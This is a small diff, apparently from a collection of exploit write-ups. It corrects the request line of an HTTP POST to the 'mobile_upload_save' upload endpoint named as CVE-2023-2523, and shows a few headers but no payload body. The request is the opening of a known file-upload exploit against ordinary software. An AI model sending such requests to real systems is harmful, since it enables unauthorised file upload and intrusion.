@@ -21,7 +21,7 @@ Content-Type: application/octet-stream
 **CVE-2023-2523**
 
 ```
-POST/Emobile/App/Ajax/ajax.php?action=mobile_upload_save  HTTP/1.1 
+POST /Emobile/App/Ajax/ajax.php?action=mobile_upload_save  HTTP/1.1 
 Host:192.168.233.10:8082  
 Cache-Control:max-age=0  
 Upgrade-Insecure-Requests:1  
